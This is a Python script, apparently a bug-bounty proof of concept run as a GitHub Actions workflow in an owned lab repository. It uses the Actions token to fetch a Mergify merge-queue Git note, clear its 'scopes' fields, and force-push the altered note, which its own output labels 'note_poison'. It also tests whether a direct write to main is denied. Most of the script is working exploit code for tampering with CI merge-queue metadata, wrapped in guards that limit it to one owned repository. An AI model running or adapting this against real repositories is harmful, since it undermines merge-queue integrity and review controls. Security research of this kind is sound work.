"""One guarded Actions-token write to a genuine R3 batch's Git note.

This file is installed unchanged on the owned R3 main branch.  It accepts
only exact batch/head/note/main identities supplied at workflow_dispatch.
It does not update a branch, publish a check, or use a Mergify credential.
"""

from __future__ import annotations

import hashlib
import json
import os
import re
import subprocess
import sys
from urllib.error import HTTPError
from urllib.request import Request, urlopen

import yaml


REPO = "acarranza-labs/mergify-onapp-public-lab-20261004"
REPO_ID = 1404856005
SHA = re.compile(r"[0-9a-f]{40}\Z")
BRANCH = re.compile(r"mergify/merge-queue/[0-9a-f]+\Z")


def insist(ok: bool, why: str) -> None:
    if not ok:
        raise RuntimeError(why)


def git(*args: str) -> str:
    result = subprocess.run(["git", *args], text=True, capture_output=True,
                            encoding="utf-8", errors="replace", check=False)
    if result.returncode:
        raise RuntimeError(f"git {args[0]} failed (exit {result.returncode})")
    return result.stdout.strip()


def gh(method: str, path: str, body: dict | None = None) -> tuple[int, dict | list | None]:
    insist(path == f"repos/{REPO}" or path.startswith(f"repos/{REPO}/"),
           "GitHub path left fixed owned R3")
    token = os.environ["GH_TOKEN"]
    payload = None if body is None else json.dumps(body).encode("utf-8")
    request = Request("https://api.github.com/" + path, data=payload, method=method,
                      headers={"Authorization": "Bearer " + token,
                               "Accept": "application/vnd.github+json",
                               "X-GitHub-Api-Version": "2022-11-28",
                               "User-Agent": "owned-r3-notes-lab",
                               "Content-Type": "application/json"})
    try:
        with urlopen(request, timeout=20) as response:
            raw = response.read()
            return response.status, json.loads(raw) if raw else None
    except HTTPError as error:
        # Never print the request, response body, or authorization header.
        return error.code, None


def require_sha_env(name: str) -> str:
    value = os.environ[name]
    insist(bool(SHA.fullmatch(value)), f"{name} is not a full SHA-1")
    return value


def require_int_env(name: str) -> int:
    value = os.environ[name]
    insist(value.isdecimal() and 0 < int(value) < 2**31,
           f"{name} is not a positive PR number")
    return int(value)


def exact_pr(number: int) -> dict:
    status, result = gh("GET", f"repos/{REPO}/pulls/{number}")
    insist(status == 200 and isinstance(result, dict), "Expected PR unavailable")
    return result


def live_ref(branch: str) -> str:
    status, ref = gh("GET", f"repos/{REPO}/git/ref/heads/{branch}")
    insist(status == 200 and isinstance(ref, dict), "Expected branch ref unavailable")
    return ref["object"]["sha"]


def note_mapping(raw: str, first: int, second: int) -> dict:
    value = yaml.safe_load(raw)
    insist(isinstance(value, dict), "Genuine note is not a YAML mapping")
    base = value.get("checking_base_sha")
    insist(isinstance(base, str) and bool(SHA.fullmatch(base)),
           "Genuine note lacks full checking_base_sha")
    scopes = value.get("scopes")
    insist(isinstance(scopes, list) and all(isinstance(x, str) for x in scopes)
           and "api" in scopes, "Genuine note lacks real api scope")
    insist(value.get("all_scopes") is not True, "Batch is an all-scopes barrier")
    pulls = value.get("pull_requests")
    insist(isinstance(pulls, list) and len(pulls) == 2 and
           {p.get("number") for p in pulls if isinstance(p, dict)} == {first, second},
           "Genuine note does not identify exactly the two owned candidate PRs")
    for pull in pulls:
        if "scopes" in pull:
            insist(isinstance(pull["scopes"], list) and
                   all(isinstance(x, str) for x in pull["scopes"]),
                   "A pull_requests.scopes field is malformed")
    return value


def main() -> None:
    insist(os.environ.get("GITHUB_REPOSITORY") == REPO, "Workflow repository differs")
    insist(os.environ.get("GITHUB_EVENT_NAME") == "workflow_dispatch",
           "Only fixed workflow_dispatch is allowed")
    batch_num = require_int_env("EXPECT_BATCH_PR")
    first, second = require_int_env("EXPECT_FIRST_PR"), require_int_env("EXPECT_SECOND_PR")
    insist(first != second and batch_num not in (first, second), "PR identities overlap")
    batch_head = require_sha_env("EXPECT_BATCH_HEAD")
    note_before = require_sha_env("EXPECT_NOTES_REF_SHA")
    main_before = require_sha_env("EXPECT_MAIN_SHA")
    status, repo = gh("GET", f"repos/{REPO}")
    insist(status == 200 and isinstance(repo, dict) and repo.get("id") == REPO_ID
           and repo.get("full_name") == REPO and repo.get("private") is False
           and repo.get("fork") is False, "Fixed public R3 identity changed")
    insist(live_ref("main") == main_before, "main moved before mutation")
    batch = exact_pr(batch_num)
    branch = (batch.get("head") or {}).get("ref", "")
    insist(bool(BRANCH.fullmatch(branch)) and batch.get("state") == "open"
           and batch.get("base", {}).get("ref") == "main"
           and batch.get("head", {}).get("sha") == batch_head
           and batch.get("head", {}).get("repo", {}).get("id") == REPO_ID
           and batch.get("user", {}).get("login") == "mergify[bot]"
           and str(batch.get("title", "")).startswith("merge queue:")
           and live_ref(branch) == batch_head, "Batch PR/ref changed")
    body = batch.get("body") or ""
    insist(f"#{first}" in body and f"#{second}" in body,
           "Batch body does not identify candidate PRs")
    for number in (first, second):
        pr = exact_pr(number)
        insist(pr.get("state") == "open" and
               pr.get("head", {}).get("repo", {}).get("full_name") == REPO and
               pr.get("base", {}).get("ref") == "main",
               "Candidate PR identity changed")
    status, files = gh("GET", f"repos/{REPO}/pulls/{batch_num}/files?per_page=100")
    insist(status == 200 and isinstance(files, list) and len(files) == 2 and
           {f.get("filename") for f in files} == {
               "api/candidate/a-canary.txt", "api/candidate/b-canary.txt"} and
           all(f.get("status") == "added" for f in files),
           "Batch diff is not exactly the two inert candidate files")

    notes_ref = "refs/notes/mergify/" + branch
    notes_short = "mergify/" + branch
    remote_note = git("ls-remote", "--refs", "origin", notes_ref).split()
    insist(len(remote_note) == 2 and remote_note[0] == note_before and
           remote_note[1] == notes_ref, "Notes ref moved or disappeared")
    git("fetch", "--no-tags", "origin", "+" + notes_ref + ":" + notes_ref)
    insist(git("rev-parse", notes_ref) == note_before, "Fetched notes ref differs")
    original = git("notes", "--ref=" + notes_short, "show", batch_head)
    parsed = note_mapping(original, first, second)
    unchanged_base = parsed["checking_base_sha"]
    original_hash = hashlib.sha256(original.encode("utf-8")).hexdigest()

    # The same restricted GITHUB_TOKEN must fail a real main update, while
    # leaving the tree identical even in the unexpected success case.
    status, main_commit = gh("GET", f"repos/{REPO}/git/commits/{main_before}")
    insist(status == 200 and isinstance(main_commit, dict), "main commit unavailable")
    status, trial = gh("POST", f"repos/{REPO}/git/commits", {
        "message": "Bounty notes lab: denied same-tree main update",
        "tree": main_commit["tree"]["sha"], "parents": [main_before]})
    insist(status == 201 and isinstance(trial, dict) and
           bool(SHA.fullmatch(trial.get("sha", ""))), "Cannot create same-tree denial commit")
    denial, _ = gh("PATCH", f"repos/{REPO}/git/refs/heads/main", {
        "sha": trial["sha"], "force": False})
    insist(denial in (403, 409, 422) and live_ref("main") == main_before,
           f"Direct-main denial failed or main moved (HTTP {denial})")

    altered = yaml.safe_load(original)
    altered["scopes"] = []
    altered["all_scopes"] = False
    for pull in altered["pull_requests"]:
        if "scopes" in pull:
            pull["scopes"] = []
    insist(altered["checking_base_sha"] == unchanged_base,
           "Mutation unexpectedly changed checking_base_sha")
    altered_text = yaml.safe_dump(altered, sort_keys=False, allow_unicode=True)
    altered_hash = hashlib.sha256(altered_text.encode("utf-8")).hexdigest()
    note_file = os.path.join(os.environ["RUNNER_TEMP"], "bounty-altered-note.yml")
    with open(note_file, "w", encoding="utf-8") as handle:
        handle.write(altered_text)
    git("config", "user.name", "github-actions[bot]")
    git("config", "user.email", "41898282+github-actions[bot]@users.noreply.github.com")
    git("notes", "--ref=" + notes_short, "add", "-f", "-F", note_file, batch_head)
    note_after = git("rev-parse", notes_ref)
    insist(bool(SHA.fullmatch(note_after)) and note_after != note_before,
           "Note ref did not advance")
    git("push", "--force-with-lease=" + notes_ref + ":" + note_before,
        "origin", notes_ref + ":" + notes_ref)
    remote_after = git("ls-remote", "--refs", "origin", notes_ref).split()
    insist(len(remote_after) == 2 and remote_after[0] == note_after,
           "Remote notes ref did not become the expected SHA")
    insist(live_ref("main") == main_before and live_ref(branch) == batch_head,
           "A branch moved during notes mutation")
    assert note_mapping(original, first, second)["checking_base_sha"] == unchanged_base
    print(json.dumps({"note_poison": "exact_candidate_batch_ref",
                      "batch_pr": batch_num, "batch_head": batch_head,
                      "notes_ref": notes_ref, "notes_ref_before": note_before,
                      "notes_ref_after": note_after,
                      "note_sha256_before": original_hash,
                      "note_sha256_after": altered_hash,
                      "main_sha": main_before, "main_write_http": denial,
                      "run_id": os.environ.get("GITHUB_RUN_ID")},
                     separators=(",", ":")))


if __name__ == "__main__":
    try:
        main()
    except Exception as error:
        # No secret-bearing object is formatted here.
        print(f"LAB_STOP {error}", file=sys.stderr)
        raise SystemExit(1)
